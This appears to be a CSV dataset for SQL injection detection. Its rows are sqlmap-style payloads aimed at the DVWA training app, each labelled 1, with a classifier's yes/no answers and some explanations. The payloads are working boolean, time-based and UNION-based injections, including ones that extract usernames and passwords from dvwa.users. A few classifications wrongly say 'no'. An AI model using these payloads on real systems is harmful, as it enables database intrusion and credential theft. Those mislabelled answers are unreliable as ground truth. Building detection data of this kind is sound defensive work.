input_text,Label,classification
3' AND 1679=1679 AND 'GZoE' LIKE 'GZoE,1,yes
"3"") AND 3448=9940 AND (""tPMz""=""tPMz",1,yes
"3"") AND 1679=1679 AND (""tnED""=""tnED",1,yes
"3"")) AND 3048=1945 AND ((""eNMZ""=""eNMZ",1,yes
"3"")) AND 1679=1679 AND ((""vDEU""=""vDEU",1,yes
"3""))) AND 2702=1806 AND (((""dLXo""=""dLXo",1,yes
"3""))) AND 1679=1679 AND (((""DtEe""=""DtEe",1,Yes
"3"" AND 2853=8188 AND ""JqmW""=""JqmW",1,yes
"3"" AND 1679=1679 AND ""cVAz""=""cVAz",1,yes
"3"") AND 6968=4884 AND (""vCrK"" LIKE ""vCrK",1,yes
"3"") AND 1679=1679 AND (""XhVt"" LIKE ""XhVt",1,"The input contains elements that could be used in a SQL injection attack.

Answer: yes"
"3"")) AND 5918=5702 AND ((""aEuC"" LIKE ""aEuC",1,yes
"3"")) AND 1679=1679 AND ((""LTkl"" LIKE ""LTkl",1,yes
"3""))) AND 5418=5730 AND (((""hJNa"" LIKE ""hJNa",1,yes
"3""))) AND 1679=1679 AND (((""fAFz"" LIKE ""fAFz",1,yes
"3"" AND 4727=4142 AND ""bpUw"" LIKE ""bpUw",1,yes
"3"" AND 1679=1679 AND ""DYHe"" LIKE ""DYHe",1,"The input contains elements that suggest an attempt to manipulate a SQL query through injection tactics, such as breaking out of a string context and adding additional clauses.

Answer: yes"
3 AND 3507=2582-- iUGg,1,yes
3 AND 1679=1679-- Iysz,1,yes
3 AND 8620=1572-- kEcD,1,yes
3 AND 9764=6546# MeyL,1,yes
3 AND 1679=1679# jfAv,1,Yes
3 AND 4441=6893# vVwt,1,yes
3' AND 9597=5971 OR 'sTKo'='apqM,1,yes
3' AND 1679=1679 OR 'nrFG'='vZQH,1,yes
3') WHERE 9020=9020 AND 8690=2411-- rAFb,1,yes
3') WHERE 7118=7118 AND 1679=1679-- cfHf,1,Yes
"3"") WHERE 7782=7782 AND 2263=4939-- sgkY",1,yes
"3"") WHERE 8879=8879 AND 1679=1679-- WsyC",1,yes
3) WHERE 3281=3281 AND 1721=5799-- FTNf,1,yes
3) WHERE 4089=4089 AND 1679=1679-- uUNF,1,yes
3' WHERE 3642=3642 AND 7768=7574-- exbW,1,Yes.
3' WHERE 6168=6168 AND 1679=1679-- uQYI,1,Yes
"3"" WHERE 5427=5427 AND 8559=6296-- ZJCK",1,yes
"3"" WHERE 4935=4935 AND 1679=1679-- oGLm",1,yes
3 WHERE 7001=7001 AND 6673=1393-- VoWG,1,yes
3 WHERE 6415=6415 AND 1679=1679-- ccwB,1,Yes
3'||(SELECT 0x49614a54 WHERE 2049=2049 AND 1251=4054)||',1,yes
3'||(SELECT 0x65536b47 WHERE 1418=1418 AND 1679=1679)||',1,yes
3'||(SELECT 0x4e576956 FROM DUAL WHERE 6373=6373 AND 6930=5660)||',1,Yes
3'||(SELECT 0x794f714d FROM DUAL WHERE 2313=2313 AND 1679=1679)||',1,yes
3'+(SELECT 0x7a7a6a52 WHERE 2567=2567 AND 9755=2506)+',1,yes
3'+(SELECT 0x564e4349 WHERE 5428=5428 AND 1679=1679)+',1,yes
3||(SELECT 0x61565666 FROM DUAL WHERE 2385=2385 AND 7699=6117)||,1,Yes
3||(SELECT 0x54474356 FROM DUAL WHERE 8171=8171 AND 1679=1679)||,1,yes
3||(SELECT 0x66634b76 WHERE 1537=1537 AND 2458=5204)||,1,Yes
3||(SELECT 0x724a6b75 WHERE 8287=8287 AND 1679=1679)||,1,yes
3+(SELECT hvTA WHERE 3617=3617 AND 2362=3270)+,1,yes
3+(SELECT CayR WHERE 1192=1192 AND 1679=1679)+,1,"The input contains elements typical of SQL injection attempts, such as a SELECT statement with always-true WHERE clauses, which could be used to extract data or manipulate the database.

Answer: yes"
3+(SELECT 0x504a4a68 WHERE 6929=6929 AND 8710=8766)+,1,yes
3+(SELECT 0x486d6c61 WHERE 9146=9146 AND 1679=1679)+,1,yes
3')) AS zoCL WHERE 6700=6700 AND 8854=1634-- VmmH,1,Yes
3')) AS ALhD WHERE 8593=8593 AND 1679=1679-- kBIS,1,Yes
"3"")) AS vjCQ WHERE 8969=8969 AND 6039=3979-- qbSz",1,yes
"3"")) AS nkhV WHERE 9858=9858 AND 1679=1679-- SLML",1,"The input contains elements indicative of SQL injection techniques, such as using quotes to potentially escape strings, boolean conditions that always evaluate to true, and SQL comments.

Answer: yes"
3)) AS dCfl WHERE 5674=5674 AND 7776=9581-- bGEI,1,Yes
3)) AS nPrF WHERE 6064=6064 AND 1679=1679-- aEfO,1,Yes
3') AS nBbS WHERE 2640=2640 AND 9359=2269-- fohF,1,Yes
3') AS fGya WHERE 4205=4205 AND 1679=1679-- SSzj,1,yes
"3"") AS WHzs WHERE 3087=3087 AND 1946=4389-- wVIy",1,yes
"3"") AS QxDG WHERE 8971=8971 AND 1679=1679-- NkdQ",1,"The input contains elements typical of SQL injection, such as unescaped quotes, always-true conditions, and a comment. These can be used to alter or inject malicious SQL code.

Answer: yes"
3) AS uvRp WHERE 3366=3366 AND 7599=9629-- HfUl,1,"The input contains elements typical of SQL injection attempts, such as a WHERE clause with a tautology (always true) and a comment (--), which are commonly used in injections.

Answer: yes"
3) AS tcXM WHERE 5162=5162 AND 1679=1679-- SuPQ,1,Yes.
3` WHERE 3750=3750 AND 6426=2792-- MNLa,1,Yes
3` WHERE 3415=3415 AND 1679=1679-- nELV,1,Yes
3`) WHERE 1017=1017 AND 3215=6668-- DFXb,1,yes
3`) WHERE 6710=6710 AND 1679=1679-- Ubtg,1,yes
3`=`3` AND 4744=1745 AND `3`=`3,1,Yes.
3`=`3` AND 1679=1679 AND `3`=`3,1,Yes.
"3""=""3"" AND 8682=7799 AND ""3""=""3",1,"The input contains elements that suggest potential SQL injection attempts, such as quotes around numbers and an ALWAYS FALSE condition.

Answer: yes"
"3""=""3"" AND 1679=1679 AND ""3""=""3",1,no
3]-(SELECT 0 WHERE 2519=2519 AND 2224=4800)|[3,1,yes
3]-(SELECT 0 WHERE 6201=6201 AND 1679=1679)|[3,1,yes
3' IN BOOLEAN MODE) AND 7996=3741#,1,yes
3' IN BOOLEAN MODE) AND 1679=1679#,1,yes
-1901,1,no
-4690) OR 3707=6708-- jjOd,1,"The input contains elements commonly used in SQL injection, such as ""OR"" and ""--"", indicating a potential attack.

Answer: yes"
-1321) OR 3355=3355-- goAG,1,yes
-7099') OR 9793=3875-- YIbo,1,yes
-3430') OR 3355=3355-- uzwf,1,yes
-1110' OR 2770=4671-- JuBV,1,yes
-5697' OR 3355=3355-- vCaR,1,Yes
"-1205"" OR 7704=4224-- GkLN",1,Yes
"-6948"" OR 3355=3355-- wMYN",1,Yes
-6681) OR 6325=6876 AND (1883=1883,1,yes
-9725) OR 3355=3355 AND (5279=5279,1,yes
-6212)) OR 4521=6232 AND ((1611=1611,1,yes
-9531)) OR 3355=3355 AND ((4676=4676,1,yes
-8231))) OR 7893=4854 AND (((2813=2813,1,yes
-8144))) OR 3355=3355 AND (((6947=6947,1,Yes
-2156 OR 2576=4334,1,"The input contains elements that resemble a SQL injection attempt due to the use of ""OR,"" which can be used to alter query logic. 

Answer: yes"
-2594 OR 3355=3355,1,yes
-8395 OR 4667=6951,1,yes
-4041 PxzRcTMAoc,1,no
-3448') OR 3067=8591 AND ('ffax'='ffax,1,"The input appears to contain elements typical of SQL injection, such as single quotes and logical operators that could manipulate a database query.

yes"
-9858') OR 3355=3355 AND ('ebLk'='ebLk,1,yes
-7596')) OR 1936=7086 AND (('yWox'='yWox,1,yes
-3851')) OR 3355=3355 AND (('bklS'='bklS,1,yes
-2284'))) OR 4962=9493 AND ((('QDJo'='QDJo,1,yes
-1158'))) OR 3355=3355 AND ((('sUFk'='sUFk,1,yes
-5134' OR 5829=3963 AND 'JPTe'='JPTe,1,"The input contains elements typical of SQL injection, such as escaping quotes and adding OR/AND conditions.

yes"
-3611' OR 3355=3355 AND 'LIJh'='LIJh,1,Yes.
-7235') OR 3606=1135 AND ('ijfE' LIKE 'ijfE,1,Yes
-2636') OR 3355=3355 AND ('qFnM' LIKE 'qFnM,1,"The input contains elements indicative of SQL injection, such as quotes used to terminate strings prematurely and logical operators that create always-true conditions. These are common techniques in SQL injection attacks to manipulate query results or extract data.

Answer: yes"
-1189')) OR 7043=3754 AND (('uyRk' LIKE 'uyRk,1,yes
-1879')) OR 3355=3355 AND (('SAGd' LIKE 'SAGd,1,yes
-8883'))) OR 4651=4987 AND ((('oMOF' LIKE 'oMOF,1,yes
-4480'))) OR 3355=3355 AND ((('CCJx' LIKE 'CCJx,1,yes
-5003%' OR 4343=1596 AND 'yTZn%'='yTZn,1,Yes
-7146%' OR 3355=3355 AND 'RVIF%'='RVIF,1,yes
-6710' OR 6252=2447 AND 'eaWA' LIKE 'eaWA,1,yes
-1570' OR 3355=3355 AND 'GdBt' LIKE 'GdBt,1,"The input contains elements typical of SQL injection, such as escaping quotes and introducing an OR condition that's always true.

yes"
"-7897"") OR 3547=1441 AND (""cqJH""=""cqJH",1,yes
"-7730"") OR 3355=3355 AND (""MiGg""=""MiGg",1,yes
"-4559"")) OR 3544=1735 AND ((""RlIO""=""RlIO",1,yes
"-4433"")) OR 3355=3355 AND ((""MugH""=""MugH",1,yes
"-7812""))) OR 3631=5653 AND (((""fazc""=""fazc",1,yes
"-6106""))) OR 3355=3355 AND (((""KlPZ""=""KlPZ",1,Yes
"-9225"" OR 8771=7842 AND ""CMqV""=""CMqV",1,"The input contains elements commonly used in SQL injection attempts, such as logical operators (OR, AND) and a tautology (""CMqV""=""CMqV""). These are typically used to manipulate query logic.

Answer: yes"
"-1994"" OR 3355=3355 AND ""cjin""=""cjin",1,Yes
"-4237"") OR 6406=1906 AND (""bLgT"" LIKE ""bLgT",1,yes
"-7424"") OR 3355=3355 AND (""fZih"" LIKE ""fZih",1,yes
"-3239"")) OR 2697=7161 AND ((""pDjg"" LIKE ""pDjg",1,yes
"-5459"")) OR 3355=3355 AND ((""gMMI"" LIKE ""gMMI",1,Yes
"-6057""))) OR 7595=9363 AND (((""Vswr"" LIKE ""Vswr",1,"The input contains elements that suggest a potential SQL injection attempt, such as premature string termination with quotes and use of logical operators.

Answer: yes"
"-4087""))) OR 3355=3355 AND (((""jsxC"" LIKE ""jsxC",1,yes
"-8088"" OR 7970=7005 AND ""sWTV"" LIKE ""sWTV",1,yes
"-9754"" OR 3355=3355 AND ""vrWx"" LIKE ""vrWx",1,yes
-8590 OR 5422=1482-- InoS,1,Yes
-8289 OR 3355=3355-- aFgv,1,"The input contains elements typical of SQL injection, using an OR clause with a tautology and comment syntax.

yes"
-1677 OR 6239=8630-- sHOE,1,yes
-5909 PxzRcTMAoc-- FbMB,1,yes
-5210 OR 7112=6192# TzGJ,1,Yes
-9029 OR 3355=3355# kHKS,1,Yes
-1460 OR 5815=1564# kSeH,1,Yes
-8459 PxzRcTMAoc# XVJz,1,no
-6838' OR 9328=2100 OR 'QDBQ'='MAxP,1,Yes
-7967' OR 3355=3355 OR 'wZIr'='yycM,1,"The input contains elements that suggest a SQL injection attempt, such as single quotes and an OR condition that can manipulate query results.

Answer: yes"
-1796') WHERE 7195=7195 OR 2984=9066-- lxeQ,1,yes
-2047') WHERE 4396=4396 OR 3355=3355-- YGPc,1,"The input contains elements typical of SQL injection, such as escaping quotes and using always-true conditions. 

Answer: yes"
"-2086"") WHERE 2802=2802 OR 7471=4879-- iCSp",1,Yes
"-1593"") WHERE 9753=9753 OR 3355=3355-- GuPD",1,yes
-7006) WHERE 1796=1796 OR 9999=7544-- YYFo,1,"The input includes elements typical of SQL injection, such as the WHERE clause, a tautology (always true condition), OR statement, and comment syntax (--). These components suggest an attempt to manipulate or inject SQL code.

Answer: yes"
-8079) WHERE 4283=4283 OR 3355=3355-- zWdo,1,Yes
-6496' WHERE 1512=1512 OR 2428=5275-- QGiw,1,Yes
-5226' WHERE 3034=3034 OR 3355=3355-- Mwbq,1,"The input contains elements indicative of SQL injection, such as quotes, WHERE clauses with always-true conditions, and comment syntax.

Answer: yes"
"-4937"" WHERE 8596=8596 OR 9721=2664-- gaWX",1,Yes
"-6851"" WHERE 5899=5899 OR 3355=3355-- cXDX",1,yes
-7747 WHERE 4170=4170 OR 9056=8656-- woaB,1,yes
-9059 WHERE 3252=3252 OR 3355=3355-- xeWE,1,yes
-8940')) AS XNbc WHERE 2758=2758 OR 9163=1008-- JaRN,1,"The input exhibits patterns typical of SQL injection attempts, including premature closure of statements with ""))"", use of WHERE and OR clauses to force execution, and comments (""--"") to hide malicious code. These elements suggest a potential SQL injection.

Answer: yes"
-5346')) AS yQDm WHERE 2358=2358 OR 3355=3355-- AkoM,1,yes
"-3819"")) AS kSbb WHERE 5270=5270 OR 3991=4839-- UfvX",1,"The input contains elements typical of SQL injection, such as a tautology condition and comment syntax.

Answer: yes"
"-3655"")) AS UQNd WHERE 7975=7975 OR 3355=3355-- NSFs",1,"The input contains elements typical of a SQL injection attack, such as closing parentheses to terminate existing statements early and introducing new clauses like ""WHERE"" with always-true conditions. Additionally, the use of ""--"" suggests an attempt to comment out parts of the query, which is often used in SQL injection to hide malicious code.

Answer: yes"
-4759)) AS pOfU WHERE 9195=9195 OR 5994=8186-- VHBc,1,yes
-5022)) AS fZyX WHERE 5482=5482 OR 3355=3355-- QIiU,1,Yes
-8144') AS QOjy WHERE 5218=5218 OR 7181=8745-- GPMd,1,"The input includes elements like single quotes, SQL keywords (AS, WHERE), and comment syntax (--), which are typical in SQL injection attempts.

Answer: yes"
-5987') AS Ccoz WHERE 3546=3546 OR 3355=3355-- lBzq,1,yes
"-2422"") AS FjFE WHERE 8152=8152 OR 7076=7490-- kgCB",1,yes
"-1204"") AS rvJX WHERE 6177=6177 OR 3355=3355-- cOIW",1,yes
-8943) AS ALRH WHERE 7095=7095 OR 2593=5400-- Hxtd,1,"The input contains elements typical of SQL injection, such as the comment syntax ""--"" and a tautology condition, indicating a potential injection attempt.

yes"
-1065) AS jVoP WHERE 9277=9277 OR 3355=3355-- xycH,1,"The input exhibits characteristics typical of a SQL injection attack, such as using an always-true condition in the WHERE clause and ending with a comment to bypass the rest of the query.

Answer: yes"
3) OR NOT 4163=2012-- xmRR,1,yes
3) OR NOT 5661=5661-- DcCi,1,yes
3') OR NOT 1619=4178-- iItv,1,yes
3') OR NOT 5661=5661-- rslb,1,yes
3' OR NOT 1110=2364-- GnbX,1,yes
3' OR NOT 5661=5661-- anLH,1,yes
"3"" OR NOT 9514=9352-- tsda",1,yes
"3"" OR NOT 5661=5661-- MwdZ",1,Yes
3) OR NOT 6799=6664 AND (4958=4958,1,yes
3) OR NOT 5661=5661 AND (5798=5798,1,yes
3)) OR NOT 6364=2042 AND ((1411=1411,1,yes
3)) OR NOT 5661=5661 AND ((8457=8457,1,yes
3))) OR NOT 1983=9070 AND (((7758=7758,1,yes
3))) OR NOT 5661=5661 AND (((2370=2370,1,"The input includes SQL keywords and logical operators typical of SQL injection attempts, aiming to manipulate query results or extract data.

Answer: yes"
3 OR NOT 3674=4663,1,yes
3 OR NOT 5661=5661,1,yes
3 OR NOT 6902=7008,1,yes
"(SELECT CONCAT(CONCAT(0x7176627a71,(CASE WHEN (2157=2157) THEN 0x31 ELSE 0x30 END)),0x716a7a6a71))",1,yes
"3 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176627a71,(SELECT (ELT(5348=5348,1))),0x716a7a6a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1,yes
"(SELECT CONCAT(0x7176627a71,(ELT(6769=6769,1)),0x716a7a6a71))",1,No
3;SELECT SLEEP(5)#,1,Yes
3;SELECT SLEEP(5),1,Yes
3;(SELECT * FROM (SELECT(SLEEP(5)))FNpH)#,1,Yes
3;(SELECT * FROM (SELECT(SLEEP(5)))OwTD),1,Yes
"3;SELECT BENCHMARK(5000000,MD5(0x54755357))#",1,Yes
"3;SELECT BENCHMARK(5000000,MD5(0x78417443))",1,Yes
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj),1,yes
3 AND (SELECT 7988 FROM (SELECT(SLEEP(0)))Bnmj),1,"The input contains elements indicative of SQL injection, such as the use of SELECT and SLEEP(0), which are often exploited to execute malicious commands.

Answer: yes"
3 AND (SELECT 7988 FROM (SELECT(SLEEP(5)))Bnmj),1,yes
3 ORDER BY 1-- -,1,yes
3 ORDER BY 4860-- -,1,yes
3 ORDER BY 10-- -,1,yes
3 ORDER BY 6-- -,1,yes
3 ORDER BY 4-- -,1,Yes
3 ORDER BY 3-- -,1,yes
3 ORDER BY 2-- -,1,Yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL UNION ALL SELECT CONCAT(0x7176627a71,0x69574f714b6f78734659795058646870536f6e6f706267476f727a6d43616a506b4d4a47694e4349,0x716a7a6a71),NULL-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,0x5571617a584b53434267455761446569676e6677686362546d43666c58737261546e4d4a4b58746b,0x716a7a6a71),NULL FROM (SELECT 0 AS WRTt UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS ZkPF-- -",1,Yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes.
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,Yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716a7a6a71),NULL-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716a7a6a71),NULL-- -",1,"The input uses UNION ALL to combine a query that extracts the database name via DATABASE() and other functions, indicating a potential SQL injection attempt.

Answer: yes"
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,table_name)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1,Yes.
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(table_name AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x64767761)-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6775657374626f6f6b AND table_schema=0x64767761-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`comment`,`name`,comment_id)),0x716a7a6a71),NULL FROM dvwa.guestbook-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`comment` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(`name` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(comment_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.guestbook-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,column_name,column_type)),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(column_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(column_type AS CHAR),0x20),0x716a7a6a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x64767761-- -",1,yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,JSON_ARRAYAGG(CONCAT_WS(0x6f6870787661,`user`,avatar,failed_login,first_name,last_login,last_name,password,user_id)),0x716a7a6a71),NULL FROM dvwa.users-- -",1,Yes
"3 UNION ALL SELECT CONCAT(0x7176627a71,IFNULL(CAST(`user` AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(avatar AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(failed_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(first_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_login AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(last_name AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(password AS CHAR),0x20),0x6f6870787661,IFNULL(CAST(user_id AS CHAR),0x20),0x716a7a6a71),NULL FROM dvwa.users-- -",1,yes
3 ORDER BY 6744#,1,Yes
3 ORDER BY 1#,1,yes
"3"" ORDER BY 7211#",1,yes
"3"" ORDER BY 1#",1,yes
"3"") ORDER BY 8686#",1,Yes.
"3"") ORDER BY 1#",1,Yes
3' ORDER BY 7564#,1,Yes
3' ORDER BY 1#,1,yes
3%' ORDER BY 1033#,1,Yes
3%' ORDER BY 1#,1,yes
3') ORDER BY 8686#,1,Yes.
3') ORDER BY 1#,1,yes
3' ORDER BY 3790#,1,Yes
3' ORDER BY 1#,1,Yes.
3')) ORDER BY 2914#,1,yes
3')) ORDER BY 1#,1,Yes
3') ORDER BY 2568#,1,"The input contains elements indicative of SQL injection, such as terminating a string with a single quote and using the SQL keyword ORDER BY followed by a column index. This suggests an attempt to manipulate the database query.

Answer: yes"
3') ORDER BY 1#,1,yes
3 ORDER BY 3059#,1,yes
3 ORDER BY 1#,1,Yes
3)) ORDER BY 6005#,1,Yes
3)) ORDER BY 1#,1,Yes
3) ORDER BY 5307#,1,Yes
3) ORDER BY 1#,1,yes
3 ORDER BY 7681-- exRh,1,"The input contains ""ORDER BY"", a SQL clause, which is commonly used in SQL injection attempts to manipulate queries. This indicates potential SQL injection.

yes"
3 ORDER BY 1-- IcZC,1,Yes
"3"" ORDER BY 3315-- JbsW",1,yes
"3"" ORDER BY 1-- uCuA",1,yes
"3"") ORDER BY 5441-- HOfi",1,Yes
"3"") ORDER BY 1-- eSPw",1,yes
3' ORDER BY 4422-- njvx,1,"The input contains elements typical of an SQL injection attempt: a single quote, an ORDER BY clause with a number, and comment characters. These are common in exploiting vulnerabilities.

Answer: yes"
3' ORDER BY 1-- tbrl,1,yes
3%' ORDER BY 9544-- cGHl,1,yes
3%' ORDER BY 1-- zoPm,1,Yes
3') ORDER BY 6673-- SQNQ,1,Yes
3') ORDER BY 1-- GQEW,1,"The input includes elements typical of SQL injection attempts, such as escaping quotes and inserting SQL commands like ORDER BY. 

Answer: yes"
3' ORDER BY 7280-- qZqT,1,yes
3' ORDER BY 1-- Qrjg,1,yes
3')) ORDER BY 1744-- uSNP,1,Yes
3')) ORDER BY 1-- bQjG,1,Yes
3') ORDER BY 2936-- FxFH,1,"The input contains elements typical of a SQL injection attempt, using an apostrophe to potentially escape string contexts and inject commands like ORDER BY. 

Answer: yes"
3') ORDER BY 1-- iZtd,1,yes
3 ORDER BY 9405-- ARju,1,yes
3 ORDER BY 1-- yJiY,1,yes
3)) ORDER BY 6140-- ueVq,1,yes
3)) ORDER BY 1-- aYYF,1,yes
3) ORDER BY 4028-- xiFv,1,yes
3) ORDER BY 1-- RJwx,1,Yes
(CASE WHEN (6860=6860) THEN SLEEP(5) ELSE 6860 END),1,Yes
3 AND 7867=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- gmne,1,yes
